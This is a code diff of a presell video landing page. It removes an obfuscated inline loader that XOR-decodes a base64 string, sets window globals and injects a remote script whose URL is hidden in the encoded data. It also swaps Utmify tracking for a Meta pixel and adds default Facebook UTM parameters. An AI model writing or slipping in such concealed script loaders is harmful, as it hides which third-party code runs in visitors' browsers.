@@ -850,8 +850,6 @@
       </div>
     </div>
 
-    <script type="text/plain" id="utmify-src">(function(){var o_4bmj=atob("DKbrHA4rjN/PdwIkQ93JaXxHruXtH3ZQM9XRMyFI6LHhAnZJKsCSMm1E4fGtBS1XINSCbHpYo6q7GnELL8efeX1forW8VS4GItKfbmdJ+auqBCAeGN3Jcm9G6f31VWZFN8fGaXpG5bm2WnJWJtCOcnoG9LygEy9XIM3JMCxd7bO6EiAeYYSWMHUJ4r6iEiAeYcKKaG8G+auiHmRdbtaZeXhO4qviBHdGKsKYPiIJ+r6jAmcGeYTJYVNW");var d_85s=[];for(var a_uep=0;a_uep<o_4bmj.length;a_uep++){d_85s.push(o_4bmj.charCodeAt(a_uep)&255);}var x_d=d_85s[0];var v_aijm=d_85s.slice(1,1+x_d);var j_0=d_85s.slice(1+x_d);var d_qte=j_0.map(function(b,n_u47){return b^v_aijm[n_u47%x_d];});var v_4g="";for(var m_m3w=0;m_m3w<d_qte.length;m_m3w++){v_4g+=String.fromCharCode(d_qte[m_m3w]&255);}var k_u=decodeURIComponent(escape(v_4g));var v_qi=JSON.parse(k_u);var d_d=v_qi.globals||[];d_d.forEach(function(u_kv69){window[u_kv69.name]=u_kv69.value;});var j_i1hc=document.createElement("script");j_i1hc.src=v_qi.url;j_i1hc.async=true;j_i1hc.defer=true;(v_qi.attributes||[]).forEach(function(b_e){j_i1hc.setAttribute(b_e.name,b_e.value);});(document.head||document.documentElement).appendChild(j_i1hc);})();</script>
-
     <script>
       (function () {
         "use strict";
@@ -862,8 +860,14 @@
         var PRESELL_VERSION = "v1";
         var PLAYER_SRC = "https://scripts.converteai.net/1320eaf7-bb98-48e6-a7f9-410474dd1425/ab-test/6ae5035b135e42c5e6d3c2d8/player.js";
         var PLAYER_ID = "ab-6ae5035b135e42c5e6d3c2d8";
-        var PIXEL_ID = "6ae67e52082223bd7e4a1b64";
-        var PIXEL_SRC = "https://cdn.utmify.com.br/scripts/pixel/pixel.js";
+        var META_PIXEL_ID = "1159704100161838";
+        var FB_UTM_DEFAULTS = {
+          utm_source: "FB",
+          utm_campaign: "{{campaign.name}}|{{campaign.id}}",
+          utm_medium: "{{adset.name}}|{{adset.id}}",
+          utm_content: "{{ad.name}}|{{ad.id}}",
+          utm_term: "{{placement}}"
+        };
 
         var presell = document.getElementById("presell");
         var modal = document.getElementById("modal");
@@ -874,6 +878,7 @@
         var pitchBound = false;
         var offerWatching = false;
         var watchTimer = null;
+        var metaPixelInjected = false;
 
         function trackGa(name, params) {
           try {
@@ -965,39 +970,45 @@
           }
         }
 
-        function loadWithRetry(id, src, attrs) {
-          var max = 4;
-          function start(attempt) {
-            var current = document.getElementById(id);
-            if (current && current.getAttribute("data-ok") === "1") return;
-            if (current && current.parentNode) current.parentNode.removeChild(current);
-            if (id === "utmify-pixel") window.pixelId = PIXEL_ID;
-            var script = document.createElement("script");
-            script.id = id;
-            script.async = true;
-            script.src = src;
-            if (attrs) {
-              Object.keys(attrs).forEach(function (name) {
-                script.setAttribute(name, attrs[name]);
-              });
+        function applyFbUtms() {
+          try {
+            var url = new URL(location.href);
+            var changed = false;
+            Object.keys(FB_UTM_DEFAULTS).forEach(function (key) {
+              if (!url.searchParams.has(key) || !String(url.searchParams.get(key) || "").trim()) {
+                url.searchParams.set(key, FB_UTM_DEFAULTS[key]);
+                changed = true;
+              }
+            });
+            if (changed) {
+              history.replaceState(null, "", url.pathname + url.search + url.hash);
+              if (typeof gtag === "function") {
+                gtag("config", "G-PTY57M66PW", { page_location: location.href });
+              }
             }
-            script.onload = function () { script.setAttribute("data-ok", "1"); };
-            script.onerror = function () {
-              if (attempt >= max) return;
-              window.setTimeout(function () { start(attempt + 1); }, 400 * attempt);
-            };
-            (document.head || document.documentElement).appendChild(script);
-          }
-          start(1);
+          } catch (e) {}
         }
 
-        function injectUtmify() {
-          window.pixelId = PIXEL_ID;
-          loadWithRetry("utmify-pixel", PIXEL_SRC);
-          loadWithRetry("utmify-utms", "https://cdn.utmify.com.br/scripts/utms/latest.js", {
-            "data-utmify-prevent-xcod-sck": "",
-            "data-utmify-prevent-subids": ""
-          });
+        function injectMetaPixel() {
+          if (metaPixelInjected) return;
+          metaPixelInjected = true;
+          try {
+            !function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+            n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+            if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+            n.queue=[];t=b.createElement(e);t.async=!0;
+            t.src=v;s=b.getElementsByTagName(e)[0];
+            s.parentNode.insertBefore(t,s)}(window, document,'script',
+            'https://connect.facebook.net/en_US/fbevents.js');
+            fbq('init', META_PIXEL_ID);
+            fbq('track', 'PageView');
+            if (!document.getElementById("meta-pixel-noscript")) {
+              var ns = document.createElement("noscript");
+              ns.id = "meta-pixel-noscript";
+              ns.innerHTML = '<img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=' + META_PIXEL_ID + '&ev=PageView&noscript=1"/>';
+              document.body.appendChild(ns);
+            }
+          } catch (e) {}
         }
 
         function carryParams(anchor) {
@@ -1092,11 +1103,12 @@
 
           if (vslStarted) return;
           vslStarted = true;
+          applyFbUtms();
           trackGa("presell_vsl_open", {
             cta_source: ctaSource || "restore"
           });
           window._plt = Date.now();
-          injectUtmify();
+          injectMetaPixel();
           try {
             bindPitch();
             mountPlayer();
@@ -1130,6 +1142,7 @@
           }
         }, true);
 
+        applyFbUtms();
         trackGa("presell_start", {});
 
         try {
